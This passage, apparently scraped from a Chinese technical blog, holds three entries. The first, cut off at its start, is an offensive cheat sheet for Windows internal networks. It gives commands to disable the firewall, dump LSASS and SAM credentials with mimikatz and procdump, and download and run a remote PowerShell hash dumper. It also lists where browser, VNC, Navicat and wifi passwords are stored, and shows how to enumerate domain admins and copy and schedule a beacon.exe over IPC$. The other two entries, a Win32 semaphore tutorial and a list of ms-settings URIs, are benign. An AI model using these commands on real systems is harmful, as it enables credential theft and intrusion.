firewall add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable #允许nc的全部链接#2003之后操作netsh advfirewall set allprofiles state off #关闭防火墙netsh advfirewall set publicprofile state off #关闭防火墙，??##允许nc的入站、出站、TCP3389进站连接netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \\nc.exe&quot;netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \\nc.exe&quot;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow##自定义防火墙日志的存储位置netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot; 自动化收集脚本：Empire、VBS脚本 判断是否在域中 0x02 收集敏感信息抓Win密码和hash123456789101112131415# win10或2012R2以上时,默认在内存缓存中禁止保存明文密码，需要修改注册表重启后才能。reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f# 简单抓密码mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot;# 转储lsass.exe成dmp文件，再使用mimikatz本地读取（规避）procdump64.exe -accepteula -ma lsass.exe lsass.dmpmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;# powershell远程加载powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1’);Get-PassHashes# 转储SAM文件，再使用secretsdump.py本地读取（规避）python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL win日志 - RDP登录痕迹 内网使用RDP的机器大概率是运维或高权限机器，可筛选LogonType为10 的Win日志，定位ip，然后ping -a 123wevtutil qe /?wevtutil qe Security /c:3 /rd:true /f:text #3条、最近的、txt格式，/q xpath语法wevtutil qe security /q:&quot;*[EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;] and System[(EventID=4624)]]&quot; /f:text /rd:true /c:10 浏览器一把梭：HackBrowserData https://github.com/moonD4rk/HackBrowserData Chrome12345678#用户数据目录 %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\#缓存目录 %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cache\\#书签 %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Bookmarks#Cookie %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies#浏览历史 %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History#当前的session %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Current Session#账户密码 %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1\\Login Data QQ浏览器12345678⽤户数据⽬录 %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default缓存⽬录 %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cache\\书签 %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\BookmarksCookie %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\Cookies浏览历史 %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\History当前的session %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\Current Session账号密码 %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\Login Data %LOCALAPPDATA%\\Tencent\\QQBrowser\\User Data\\Default\\xxxxxxxxxxx\\6 360浏览器1账号密码⽂件 %APPDATA%\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db firefox1账号密码⽂件 %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json IE&#x2F;Edge1书签⽂件 %USERPROFILE%\\Favorites\\xx.url 远程管理工具数据库管理工具、远程登录 navicat1234567MySQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\Navicat\\Servers&lt;your connection name&gt;MariaDB HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMARIADB\\Servers&lt;your connection name&gt;MongoDB HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMONGODB\\Servers&lt;your connection name&gt;MSSQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMSSQL\\Servers&lt;your connection name&gt;Oracle HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatOra\\Servers&lt;your connection name&gt;PostgreSQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatPG\\Servers&lt;your connection name&gt;SQLite HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatSQLite\\Servers&lt;your connection name&gt; SecurtCRT12xp/win2003 C:\\Documents and Settings\\USERNAME\\Application Data\\VanDyke\\Config\\Sessionswin7/win2008以上 %APPDATA%\\VanDyke\\Config\\Sessions XShell12Xshell 5 %userprofile%\\Documents\\NetSarang\\Xshell\\SessionsXshell 6 %userprofile%\\Documents\\NetSarang Computer\\6\\Xshell\\Sessions VNC 1234RealVNC HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\vncserver PasswordTightVNC HKEY_CURRENT_USER\\Software\\TightVNC\\Server Value Password or PasswordViewOnlyTigerVNC HKEY_LOCAL_USER\\Software\\TigerVNC\\WinVNC4 PasswordUltraVNC C:\\Program Files\\UltraVNC\\ultravnc.ini passwd or passwd2 VPN 1mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit Wifi账号密码123456789101112131415161718查看帮助 netsh wlan help列出⽆线接 netsh wlan show interface开启⽆线接 netsh interface set interface &quot;Interface Name&quot; enabled显示连接过的WIFI的配置⽂件 netsh wlan show profiles连接指定wifi netsh wlan connect name=xxxx断开连接 netsh wlan disconnect查看连接过的WIFI的配置⽂件(包含账号密码)，需要管理员权限执⾏，然后使⽤type命令查看配置⽂件netsh wlan export profile interface=WLAN key=clear folder=C:\\type C:\\xxx.xml批量显示wifi账号密码for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear其它常⽤的命令： 导出配置⽂件：netsh wlan export profile key=clear 删除配置⽂件：netsh wlan delete profile name=&quot;&quot; 添加配置⽂件：netsh wlan add profile filename=&quot;&quot; 0x03 域信息收集判断是否在域中本地普通用户：只能查询本机信息 本地管理员用户：可以查域内信息。提升Ntauthority或System权限后作为域内的机器账户进行认证。 域用户：可以查域内信息。使用kerberos协议自动认证。 本地普通用户：本机计算机名\\john 本地管理员用户：本机计算机名\\administrator 域用户：域名\\user01 几种判断方式 123456789101112131415161718---------------利用计算机名和用户名判断--------------------echo %userdomain% &amp; hostname &amp;&amp; whoami # whoami 前的就是域名或主机名set l # 本机主机名、域控主机名---------------利用DNS服务器一般也部署在DC上判断--------------------ipconfig /all # &lt;主 DNS 后缀&gt;、&lt;DNS 后缀搜索列表&gt; 就是域名nslookup &lt;主 DNS 后缀&gt; # 得到域控ip---------------利用时间服务器一般也部署在DC上判断--------------------net time /domain 发生系统错误 5 #存在域，但当前用户不是域用户 \\\\XXX 的当前时间 #存在域，且当前用户是域用户 找不到域 WORKGROUP 的域控制器。 #当前为工作组环境---------------结果不为WORKGROUP则在域中--------------------systeminfo | findstr 域:net config workstation | findstr 工作站域 收集域内信息查询域名、域策略、域信任关系、域计算机列表、域控、域管、域控 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950whoami /all # 获取用户SID，SID去掉后四位就是计算机/域SIDsc showsid server # 获取某服务的SID---------------查看有几个域名--------------------net view //无参时：查看当前域或组内的其它计算机名称列表net view /domain //查看有几个域net view /all \\\\&lt;ip/hostname&gt; //带参数：查看远程计算机的文件共享列表，错误5dir /Q \\\\&lt;ip/hostname&gt;\\&lt;共享名&gt; //查看某个共享名type \\\\&lt;ip/hostname&gt;\\&lt;共享名&gt;\\&lt;文件名&gt; //查看共享文件copy .\\backdoor.txt \\\\&lt;ip/hostname&gt;\\&lt;共享名&gt; //上传本地文件到目标共享--------------获取域策略信息--------------------nltest /domain_trusts //获取域信任信息net accounts /domain //获取域密码策略net group /domain //查看所有域组名--------------获取域计算机列表--------------------net view /domain:GOD //查看god域中的计算机列表net group &quot;domain computers&quot; /domain //查看所有域成员计算机列表--------------定位域控--------------------nltest /DCLIST:&lt;域名&gt;nslookup -type=SRV _ldap._tcpnet time /domain //一般时间服务器为主/备域控net group &quot;domain controllers&quot; /domain //通过域控组查询netdom query pdc //查看所有域控的主机名，命令不可用。。--------------查域管理员用户--------------------net group &quot;domain admins&quot; /domainnet group &quot;Enterprise Admins&quot; /domain--------------查询域用户--------------------net localgroup administrators //查看本地管理员组（因为Domain Admins组默认属于域内机器的本地管理员组）net user /domain //查看域中所有的用户名，包括域管理net user &lt;用户名&gt; /domain //查看指定用户的详细列表wmic useraccount get /all //获取域用户的详细信息dsquery //域控管理工具dsquery user //查看域内用户dsquery computer - 查找目录中的计算机dsquery contact - 查找目录中的联系人dsquery subnet - 查找目录中的子网dsquery group - 查找目录中的组dsquery ou - 查找目录中的组织单位dsquery site - 查找目录中的站点dsquery server - 查找目录中的域控制器dsquery user - 查找目录中的用户dsquery quota - 查找目录中的配额dsquery partition - 查找目录中的分区dsquery * - 用通用的 LDAP 查询查找目录中的任何对象 域提权通过日志定位：指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出查看 通过会话&#x2F;进程定位：指域内每台机器的登录会话，可以使用netsess.exe、PowerView等工具匿名查询。 域提权 - 定位域管理员漏洞拿机器，然后抓域管明文或hash？ PS: 当拿下边界服务器进行横向移动时，需要先知道当前域用户的登录位置、是否是其它系统的本地管理员、所属组、是否有权访问文件共享。 服务器加域后，系统会自动将domain admins组加到域成员服务器的administrators组，因此域管理员组的成员均可访问本地计算机，并具有管理员权限。 常用工具：psloggedon.exe、PVEFindADUser.exe、netsess.exe、hunter、NetView、PowerShell - PowerView bloodyAD.py查询域内信息的一款工具，主要用来修改账户属性、 新增机器账户，其它查询功能较为常规。 psloggedon.exenet session 可以查看谁使用了本机资源，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。原理是：调用NetSessionEnum API检查注册表HKEY_USERS项的key值来查询谁登陆过。 12345psloggedon.exe - #psloggedon.exe -l #仅显示本地登录psloggedon.exe -x #不显示登录时间psloggedon.exe \\\\&lt;计算机名&gt; #列出指定计算机的登录信息psloggedon.exe &lt;用户名&gt; #指定用户名，在网络种搜索该用户登录的计算机。 PVEFindADUser.exePVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。 123456789netview.exe -h #帮助netview.exe -f filename.txt #指定要提取主机列表的文件netview.exe -e filename.txt #指定要排除的主机名的文件netview.exe -o filename.txt #将所有输出重定向到指定的文件netview.exe -d domain 指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表netview.exe -g group 指定搜索的组名。如果没有指定，则在Domain Admins组中搜索netview.exe -c 对已找到的共享目录/文件的访问权限进行检查netview.exe -i interval 枚举主机之间等待的秒数netview.exe -j jitter 应用于间隔的抖动百分比（0.0-1.0） netview.exenetview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。 123456789netview.exe -h #帮助netview.exe -f filename.txt #指定要提取主机列表的文件netview.exe -e filename.txt #指定要排除的主机名的文件netview.exe -o filename.txt #将所有输出重定向到指定的文件netview.exe -d domain 指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表netview.exe -g group 指定搜索的组名。如果没有指定，则在Domain Admins组中搜索netview.exe -c 对已找到的共享目录/文件的访问权限进行检查netview.exe -i interval 枚举主机之间等待的秒数netview.exe -j jitter 应用于间隔的抖动百分比（0.0-1.0） Nmap - NSE脚本smb-enum-domains.nse 枚举域控，获取主机信息、用户、可使用密码策略的用户等 smb-enum-users.nse 扫描域控，获取更多的域用户信息 smb-enum-shares.nse 遍历远程主机的共享目录 smb-enum-processes.nse 对主机的系统进程进行遍历，目标主机运行着哪些软件 smb-enum-sessions.nse 获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限 smb-os-discovery.nse 收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息 PowerView 脚本域提权 - 定位域管进程令牌窃取，以达到域权限提升的目的？ 方法1：会话&#x2F;进程检查域管 定位域管会话，拿下机器，抓域管密码。 定位域管进程，拿下机器，令牌窃取。 1234567891011121314# 单机查找quser # 查看当前机器会话，关注是否有域管账户，导lsass.exe快照，抓明文tasklist /v # 查看进程，关注进程启动用户，可能有域管，令牌窃取- tasklist /v /fi &quot;USERNAME eq 域名\\域管名&quot;# 批量检查域管进程## 先导一份域管名单net group &quot;Domain Admins&quot; /domain # 查域管## 收集的待检查机器ipips.txt ## p73 for 循环批量导远程机器进程，然后用域管名单筛选。tasklist /v /s &lt;ip&gt; /u &lt;user&gt; /p &lt;passwd&gt; # 核心命令，查看远程机器进程，？？？此处存疑，当前账户可以登其它机器，不就是域管？ 方法2：批量搜索域控上的域用户会话 定位域管会话，拿下机器，抓域管密码。 123456789# 1、获取筛选信息net group &quot;Domain Controllers&quot; /domain # 查域控机器名net group &quot;Domain Admins&quot; /domain # 查域管# 2、netsess.exe 收集所有活动域的会话列表，返回活动会话的ip、域账户、会话时间、会话空闲时间# 3、筛选得到域控上的域用户会话p72 cmd for 命令 Get Domain Admins（GDA）批处理脚本一把锁 方法3：批量搜索远程机器NetBIOS 定位域管会话，某些版本windows允许用户通过NetBIOS查询已登录用户。 12nbtstat -A &lt;IP&gt; # p73 for循环 0x04 内网横向思路及如何跨网段1、我是谁、我在哪、我的目标 2、信息收集 3、横向移动 探测域内存活主机 NetBIOS探测： ICMP探测：for in ARP扫描：arp.exe、Empire - arpscan、Nishang - Invoke-ARPScan.ps1 TCP&#x2F;UDP端口扫描：nmap、masscan、telnet、MSF - portscan模块、Nishang - Invoke-PortScan.ps1、PowerSploit - Invoke-portscan.ps1 ICMP探测 for in 1for /l %i in (1,1,255) do @ ping 172.16.1.%i -w 1 -n 1 | find /i &quot;ttl=&quot; vbs脚本 cscript 1.vbs 1p51 ARP扫描 动静是否会太大。 TCP&#x2F;UDP端口扫描 找网段DNS区域传输漏洞 DNS 区域传送（DNS zone transfer）是指一台备用 DNS 服务器使用来自主 DNS 服务器的数据刷新自己的域（zone）数据库，从而避免主 DNS 服务器因意外故障影响到整个域名解析服务。 DNS区域传送方式：axfr：完全区域传送、ixfr：增量区域传送 DNS区域传输漏洞：一般来说DNS区域传送只在主备DNS服务器间使用，但由于主服务器错误配置，导致任意用户发起请求后可获得一个zone数据库的详细信息。 修复方式：添加allow-transfer，配置ip白名单 利用 12nslookupls &lt;完整域名&gt; 1nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain=域名&quot; -Pn -p 53 192.168.101.152 远程连接1234567891011121314151617建立IPC连接命令：net use \\\\191.168.52.136\\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;断开连接：net use \\\\x.x.x.x\\ipc$ /del查看连接是否建立：net use测试连接：dir \\\\191.168.52.136\\c$拷贝木马：copy beacon.exe \\\\191.168.52.136\\c$创建计划任务(at&lt;2012、schtasks&gt;=2012)：at \\\\191.168.52.136 15:47 c:\\beacon.exe 主机名端口 - 重点关注的组件数据库凭据：抓navicat凭据、弱口令 1433 sqlserver sa用户 利用xp_cmdshell、sp_configure、sp_*提权 3306 mysql root用户 利用udf提权 ‘udf提权原理详解 - ka1n4t - 博客园 1521 oracle 6379 redis未授权漏洞利用 9200 ES未授权 27017 MongoDB未授权 web应用 - 重点OA：通达、泛微、帆软 邮箱：coremail shiro、solr、weblogic 集权系统VCenter ESXI 天擎服务端 深信服EDR 堡垒机 主机漏洞135 Wmihacker、ShareWmi 445 CS - psexec、MSF - exploit&#x2F;windows&#x2F;smb&#x2F;、IPC连接、Impacket工具包（psexec、smbexec、wmiexec） 3389 RDP CVE-2019-0708 5985 WinRM CS 4.1 毒液Venom","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"信息","slug":"信息","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"工具","slug":"A-OS/Windows/工具","permalink":"http://example.com/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"}]},{"title":"【Windows】线程同步之信号量（Semaphores）","date":"2023-10-27T01:24:02.026Z","path":"A_OS/Windows/多线程/线程同步之信号量Seamphorse/","text":"概述： semaphores 的说明和使用 微软官方文档： Semaphore Objects - Win32 apps | Microsoft Learn Semaphores是解决各种 producer&#x2F;consumer问题的关键要素。这种问题会存有一个缓冲区，可能在同一时间内被读出数据或被写入数据。 理论可以证明,mutex 是 semaphore 的一种退化。如果你产生一个semaphore 并令最大值为1,那就是一个 mutex。也因此, mutex又常被称为binary semaphore。在许多系统中, semaphores 常被使用, 因为 mutexes可能并不存在。在Win32中semaphores 被使用的情况就少得多，因为 mutex 存在的缘故。 创建 semaphorecreateSemaphoreA 函数 (winbase.h) - Win32 apps | Microsoft Learn 123456HANDLE CreateSemaphore( LPSECURITY_ATTRIBUTES lpAttributes, // 安全属性, 可以设置NULL LONG lInitialCount, // 初始值, [0, lMaximumCount] LONG lMaximumCount, // 最大值, 这也就是在同一时间内能够锁住semaphore之线程的最多个数 LPCTSTR lpName // 名称, 其他线程或进程可以根据名称引用该信号量; NULL则产生无名称信号量); 如果成功就传回一个handle, 否则传回NULL. 不论哪一种情况,GetLastError()都会传回一个合理的结果. 如果指定的semaphore名称已经存在,则该函数还是成功的, GetLastError()会传回ERROR_ALREADY_EXISTS. 获得 semaphore 通过信号量名，获得信号量对象句柄 OpenSemaphoreW function (synchapi.h) - Win32 apps | Microsoft Learn 12345HANDLE OpenSemaphoreW( [in] DWORD dwDesiredAccess, // 访问权限，一般传入 SEMAPHORE_ALL_ACCESS [in] BOOL bInheritHandle, // 信号量句柄继承性，一般传入TRUE即可 [in] LPCWSTR lpName // 名称，不同进程中个线程可以通过名称来确保它们访问同一个信号量); semaphore的现值代表的意义是目前可用的资源数, 如果semaphore的现值为1, 表示还有一个锁定动作可以成功; 如果现值为5, 就表示还有五个锁定动作可以成功. 每当一个锁定动作成功, semaphore的现值就会减1. 你可以使用任何一种 Wait() 函数(例如 WaitForSingleObject() )要求锁定一个semaphore. 因此, 如果semaphore的现值不为0, Wait() 函数会立刻返回.一个线程可以反复调用 Wait() 函数以产生新的锁定. 这和mutex绝不相同：拥有mutex的线程不论再调用多少次 Wait() 函数, 也不会被阻塞住。一旦semaphore的现值降到0, 就表示资源已经耗尽. 此时, 任何线程如果调用Wait…()函数, 必然要等待, 直到某个锁定被解除为止. 解除 semaphore 释放信号量 ReleaseSemaphore function (synchapi.h) - Win32 apps | Microsoft Learn 注：传入的句柄必须有 SEMAPHORE_MODIFY_STATE 权限，参考 同步对象安全性和访问权限 - Win32 apps | Microsoft Learn 12345BOOL ReleaseSemaphore( [in] HANDLE hSemaphore, // 信号量的句柄 [in] LONG lReleaseCount, // 表示增加个数，必须大于0且不超过最大资源数量 [out, optional] LPLONG lpPreviousCount // 可以用来传出先前的资源计数，设为NULL表示不需要传出); ReleaseSemaphore函数会触发WaitForSingleObject函数。ReleaseSemaphore函数用于释放一个信号量对象的计数，而WaitForSingleObject函数用于等待一个信号量对象的计数。当ReleaseSemaphore函数被调用时，它会将信号量对象的计数增加，并且如果有一个线程正在等待这个信号量对象的计数，那么这个线程就会被唤醒。因此，ReleaseSemaphore函数会触发WaitForSingleObject函数。 补充说明为什么 semaphore 要有一个初值CreateSemaphore()的第二个参数是lInitialCount, 它的存在理由和CreateMutex()的bInitialOwner参数的存在理由是一样的. 如果你把初值设定为0, 你的线程就可以在产生semaphore之后进行所有必要的初始化工作. 待初始化工作完成后, 调用 ReleaseSemaphore()就可以把现值增加到其最大可能值. Demo 多线程同步1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt; #include &lt;process.h&gt; #include &lt;windows.h&gt; long g_nNum;unsigned int __stdcall Fun(void* pPM);const int THREAD_NUM = 10;//信号量与关键段 HANDLE g_hThreadParameter;CRITICAL_SECTION g_csThreadCode;int main()&#123; printf(&quot; 经典线程同步 信号量Semaphore\\n&quot;); printf(&quot; -- by MoreWindows( http://blog.csdn.net/MoreWindows ) --\\n\\n&quot;); //初始化信号量和关键段 g_hThreadParameter = CreateSemaphore(NULL, 0, 1, NULL);//当前0个资源，最大允许1个同时访问 InitializeCriticalSection(&amp;g_csThreadCode); HANDLE handle[THREAD_NUM]; g_nNum = 0; int i = 0; while (i &lt; THREAD_NUM) &#123; handle[i] = (HANDLE)_beginthreadex(NULL, 0, Fun, &amp;i, 0, NULL); WaitForSingleObject(g_hThreadParameter, INFINITE);//等待信号量&gt;0 ++i; &#125; WaitForMultipleObjects(THREAD_NUM, handle, TRUE, INFINITE); //销毁信号量和关键段 DeleteCriticalSection(&amp;g_csThreadCode); CloseHandle(g_hThreadParameter); for (i = 0; i &lt; THREAD_NUM; i++) CloseHandle(handle[i]); return 0;&#125;unsigned int __stdcall Fun(void* pPM)&#123; int nThreadNum = *(int*)pPM; ReleaseSemaphore(g_hThreadParameter, 1, NULL);//信号量++ Sleep(50);//some work should to do EnterCriticalSection(&amp;g_csThreadCode); ++g_nNum; Sleep(0);//some work should to do printf(&quot;线程编号为%d 全局资源值为%d\\n&quot;, nThreadNum, g_nNum); LeaveCriticalSection(&amp;g_csThreadCode); return 0;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"多线程","slug":"多线程","permalink":"http://example.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"semaphores","slug":"semaphores","permalink":"http://example.com/tags/semaphores/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"多线程","slug":"A-OS/Windows/多线程","permalink":"http://example.com/categories/A-OS/Windows/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"【Windows】Win 10/11 通过命令行打开系统设置页面","date":"2023-10-27T01:24:02.025Z","path":"A_OS/Windows/【win】命令行打开系统设置页/","text":"概述: 程序中或者脚本中要打开系统设置界面时，可以使用如下方式和接口 [toc] 使用 Win32 API1::ShellExecute(hWnd, &quot;open&quot;, &quot;ms-settings:about&quot;, ...); KeyBoard Win+R启动命令行Win+R 在输入框直接输入启动的界面命令即可。 Command Line(cmd.exe)1start ms-settings:about 启动说明对照表 Settings page Uri &#x2F; Setting Name Category About (device name&#x2F;specification) ms-settings:about Windows Access work or school ms-settings:workplace Network Account info (share between apps) ms-settings:privacy-accountinfo Privacy Activation ms-settings:activation Security Activity history (build 17040+) ms-settings:privacy-activityhistory Privacy Adaptive Color Filters Link ms-settings:easeofaccess-colorfilter-adaptivecolorlink Accessibility Airplane mode (wireless&#x2F;bluetooth) ms-settings:network-airplanemode Network Airplane mode (wireless&#x2F;bluetooth) ms-settings:proximity Network App diagnostics (share between apps) ms-settings:privacy-appdiagnostics Privacy App volume and device preferences (1903) ms-settings:apps-volume Audio Apps &amp; features ms-settings:appsfeatures Apps Apps for websites ms-settings:appsforwebsites Apps AutoPlay ms-settings:autoplay Apps Automatic online file downloads ms-settings:privacy-automaticfiledownloads Apps Background apps ms-settings:privacy-backgroundapps Apps Backgrounds ms-settings:personalization-background Customisation Backup ms-settings:backup Storage Battery Saver ms-settings:batterysaver Power Battery Saver - settings ms-settings:batterysaver-settings Power Battery Saver - usage ms-settings:batterysaver-usagedetails Power Bluetooth &amp; Connected Devices ms-settings:bluetooth Network Bluetooth &amp; Connected Devices ms-settings:connecteddevices Network Calendar (share between apps) ms-settings:privacy-calendar Privacy Call history (share between apps) ms-settings:privacy-callhistory Privacy Cellular Network ms-settings:network-cellular Network Clipboard ms-settings:clipboard Apps Closed Captioning ms-settings:easeofaccess-closedcaptioning Accessibility Color Filters (build 17025+) ms-settings:easeofaccess-colorfilter Accessibility Colors ms-settings:personalization-colors ms-settings:colors Customisation Connect to a wireless display ms-settings-connectabledevices:devicediscovery Display Contacts (share between apps) ms-settings:privacy-contacts Privacy Cortana ms-settings:cortana Search Cortana more details ms-settings:cortana-moredetails Search Cortana permissions ms-settings:cortana-permissions Search Data Sense ms-settings:datausage Storage Date &amp; Time ms-settings:dateandtime Region &amp; Language Default Save Locations ms-settings:savelocations Storage Default apps ms-settings:defaultapps Apps Delivery Optimization ms-settings:delivery-optimization Windows Device Encryption (where available) ms-settings:deviceencryption Security Dial-up Network ms-settings:network-dialup Network DirectAccess ms-settings:network-directaccess Network Display ms-settings:display Display Display Screen rotation ms-settings:screenrotation Display Display Text scaling (build 17025+) ms-settings:easeofaccess-display Accessibility Document Library (share between apps) ms-settings:privacy-documents Privacy Download maps ms-settings:maps-downloadmaps Apps Dynamic Lock ms-settings:signinoptions-dynamiclock Security Ease of Access Audio (build 17035+) ms-settings:easeofaccess-audio Accessibility Edge web browser microsoft-edge:url Apps Email &amp; app accounts ms-settings:emailandaccounts Security Email (share between apps) ms-settings:privacy-email Privacy Ethernet Network ms-settings:network-ethernet Network Eye Control (build 17035+) ms-settings:easeofaccess-eyecontrol Accessibility Eye tracker (requires eyetracker hardware) ms-settings:privacy-eyetracker Privacy Family &amp; other users ms-settings:family-group Security Family &amp; other users ms-settings:otherusers Security Feedback &amp; diagnostics (privacy) ms-settings:privacy-feedback Security File System (share between apps) ms-settings:privacy-broadfilesystemaccess Privacy Find My Device ms-settings:findmydevice Security Focus assist (build 17074+) ms-settings:quiethoursOR ms-settings:quietmomentshome Apps Fonts (build 17083+) ms-settings:fonts Customisation For developers ms-settings:developers Apps Graphics Advanced scaling settings ms-settings:display-advanced Display Graphics performance preference ms-settings:display-advancedgraphics Display High Contrast ms-settings:easeofaccess-highcontrast Accessibility Home page for Settings ms-settings: Windows Keyboard ms-settings:easeofaccess-keyboard Devices Location (share between apps) ms-settings:privacy-location Privacy Lock screen ms-settings:lockscreen Security Magnifier ms-settings:easeofaccess-magnifier Accessibility Manage known Wi-Fi ms-settings:network-wifisettings Network Manage sound devices (disable&#x2F;test) ms-settings:sound-devices Audio Messaging (share between apps) ms-settings:privacy-messaging Privacy Microphone (share between apps) ms-settings:privacy-microphone Privacy Mobile Hotspot ms-settings:network-mobilehotspot Network Motion (share between apps) ms-settings:privacy-motion Privacy Mouse ms-settings:easeofaccess-mouse Accessibility Mouse &amp; Touchpad Devices ms-settings:mousetouchpad Devices Mouse Pointer (Cursor &amp; pointer, build 17040+) ms-settings:easeofaccess-cursorandpointersize Accessibility Mouse Pointer (Cursor &amp; pointer, build 17040+) ms-settings:easeofaccess-mousepointer Accessibility Multitasking ms-settings:multitasking Display Narrator ms-settings:easeofaccess-narrator Audio Network &amp; Internet ms-settings:network Network Network Status ms-settings:network-status Network Night light settings ms-settings:nightlight Customisation Notifications (share between apps) ms-settings:privacy-notifications Privacy Notifications and Actions ms-settings:notifications Customisation Offline Maps ms-settings:maps Apps Online Speech recognition ms-settings:privacy-speech Privacy Optional features ms-settings:optionalfeatures Apps Other options ms-settings:easeofaccess-otheroptions Accessibility Personalization ms-settings:personalization Customisation Picture Library (share between apps) ms-settings:privacy-pictures Privacy Power &amp; Sleep ms-settings:powersleep Power Printers ms-settings:printers Devices Privacy ms-settings:privacy Privacy Projecting to this PC ms-settings:project Display Proxy (Network) ms-settings:network-proxy Network Radio (share between apps) ms-settings:privacy-radios Privacy Recovery - Reset&#x2F;Advanced startup ms-settings:recovery Windows Region ms-settings:regionformatting Region &amp; Language Region &amp; language ms-settings:regionlanguage Region &amp; Language Remember typing patterns ms-settings:privacy-speechtyping Privacy Remote Desktop ms-settings:remotedesktop Network Search Permissions &amp; search history ms-settings:search-permissions Search Search details ms-settings:search-moredetails Search Security Key setup ms-settings:signinoptions-launchsecuritykeyenrollment Security Send Diagnostic Data to Microsoft ms-settings:privacy-feedback-telemetryviewergroup Privacy Set up a kiosk ms-settings:assignedaccess Security Shared experiences ms-settings:crossdevice Network Sign-in options ms-settings:signinoptions Security Software Center (SCCM) softwarecenter: Apps Sound (build 17063+) ms-settings:sound Audio Speech ms-settings:speech Audio Speech recognition (build 17035+) ms-settings:easeofaccess-speechrecognition Accessibility Start Menu ms-settings:personalization-start Customisation Start Menu (choose which folders appear) ms-settings:personalization-start-places Customisation Start Narrator after sign-in ms-settings:easeofaccess-narrator-isautostartenabled Audio Startup (build 17017+) ms-settings:startupapps Customisation Storage Sense ms-settings:storagesense Storage Storage Sense configuration ms-settings:storagepolicies Storage Sync your settings ms-settings:sync Network Tablet mode ms-settings:tabletmode Customisation Taskbar ms-settings:taskbar Apps Tasks (share between apps) ms-settings:privacy-tasks Privacy Text Cursor ms-settings:easeofaccess-cursor Accessibility Themes ms-settings:themes Customisation Touchpad ms-settings:devices-touchpad Devices Troubleshoot - Fix Windows Update ms-settings:troubleshoot Windows Typing ms-settings:typing Accessibility USB ms-settings:usb Devices Unpaired devices (share between apps) ms-settings:privacy-customdevices Privacy VPN ms-settings:network-vpn Network Video Library (share between apps) ms-settings:privacy-videos Privacy Video playback (build 16215+) 